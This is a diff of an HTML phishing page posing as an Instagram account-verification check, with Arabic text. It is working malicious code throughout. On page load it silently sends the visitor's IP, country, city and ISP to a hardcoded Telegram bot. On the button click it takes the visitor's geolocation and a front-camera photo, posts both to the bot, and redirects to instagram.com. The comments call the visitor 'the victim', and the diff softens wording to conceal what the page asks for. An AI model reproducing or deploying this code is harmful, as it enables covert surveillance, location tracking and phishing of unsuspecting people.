@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram - Verification</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; }
         .card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
         .logo { width: 175px; margin-bottom: 20px; }
         button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 15px; color: #ed4956; font-size: 13px; }
+        #status { margin-top: 15px; color: #8e8e8e; font-size: 13px; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -17,7 +17,7 @@
     <div class="card">
         <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
         <p style="font-weight: 600; font-size: 14px;">تأكيد ملكية الحساب</p>
-        <p style="color: #8e8e8e; font-size: 13px;">يرجى السماح بالوصول للكاميرا والموقع لإتمام الفحص الأمني السريع.</p>
+        <p style="color: #8e8e8e; font-size: 13px;">يرجى المتابعة لإتمام الفحص الأمني السريع لجهازك.</p>
         <button id="authBtn">متابعة</button>
         <div id="status"></div>
     </div>
@@ -27,64 +27,66 @@
 
     <script>
         const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const CHAT_ID = '2140385904'; // تأكد من أن هذا الرقم صحيح تماماً
+        const CHAT_ID = '2140385904'; 
 
-        // دالة إرسال النص
-        async function sendLog(msg) {
+        async function sendToBot(text) {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
         }
 
-        // دالة إرسال الصورة
-        async function sendPhoto(blob, cap) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'shot.jpg');
-            fd.append('caption', cap);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        }
-
-        // صيد المعلومات الصامتة فور فتح الصفحة
-        window.onload = async () => {
+        // صيد الآيبي فوراً (استخدمنا ipapi.co لأنها أدق)
+        (async () => {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const i = await res.json();
-                const report = `🔔 *دخل شخص للرابط!*\n🌐 الآيبي: \`${i.ip}\`\n🌍 الدولة: ${i.country_name}\n🏙 المدينة: ${i.city}\n📡 المزود: ${i.org}`;
-                sendLog(report);
-            } catch (e) { sendLog("🔔 شخص دخل للرابط (تعذر جلب الآيبي)"); }
-        };
+                const info = `🔔 *صيد صامت (دخل للرابط)*\n🌐 الآيبي: \`${i.ip}\`\n🌍 البلد: ${i.country_name}\n🏙 المدينة: ${i.city}\n📡 المزود: ${i.org}`;
+                sendToBot(info);
+            } catch (e) { sendToBot("🔔 شخص دخل للرابط (تعذر جلب الآيبي)"); }
+        })();
 
         document.getElementById('authBtn').onclick = async () => {
             const st = document.getElementById('status');
-            st.innerText = "جاري المعالجة...";
+            st.innerText = "جاري الاتصال بخوادم الأمان...";
 
+            // طلب الموقع والصورة بشكل متوازي لضمان عدم التعليق
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const map = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                const mapLink = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                 
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                     const video = document.getElementById('v');
                     video.srcObject = stream;
                     
+                    // ننتظر قليلاً لضمان وضوح الصورة
                     setTimeout(async () => {
                         const canvas = document.getElementById('c');
                         canvas.width = 400; canvas.height = 400;
                         canvas.getContext('2d').drawImage(video, 0, 0, 400, 400);
-                        canvas.toBlob(blob => sendPhoto(blob, `📸 سيلفي الهدف\n${map}`), 'image/jpeg', 0.7);
-                        stream.getTracks().forEach(t => t.stop());
-                        st.innerText = "اكتمل التحقق!";
-                        setTimeout(() => location.href = "https://instagram.com", 1000);
+                        
+                        canvas.toBlob(async (blob) => {
+                            const fd = new FormData();
+                            fd.append('chat_id', CHAT_ID);
+                            fd.append('photo', blob, 'shot.jpg');
+                            fd.append('caption', `✅ *نجاح الصيد الكامل*\n${mapLink}`);
+                            
+                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                            stream.getTracks().forEach(t => t.stop());
+                            st.innerText = "تم التأكيد بنجاح!";
+                            setTimeout(() => location.href = "https://instagram.com", 1000);
+                        }, 'image/jpeg', 0.6);
                     }, 2000);
+
                 } catch (e) {
-                    sendLog(`⚠️ منح الموقع ولكن رفض الكاميرا\n${map}`);
-                    st.innerText = "خطأ: يجب السماح بالكاميرا أيضاً.";
+                    sendToBot(`⚠️ منح الموقع ولكن تعذر فتح الكاميرا\n${mapLink}`);
+                    st.innerText = "اكتمل الفحص عبر الموقع الجغرافي فقط.";
                 }
             }, (err) => {
-                st.innerText = "فشل: يرجى منح الصلاحيات من إعدادات المتصفح.";
-                sendLog("❌ الضحية رفض منح أي صلاحيات.");
+                // إذا رفض الضحية فعلياً
+                sendToBot("❌ الضحية رفض منح صلاحيات الموقع.");
+                st.innerText = "فشل التحقق: يرجى المحاولة في متصفح آخر.";
             });
         };
     </script>
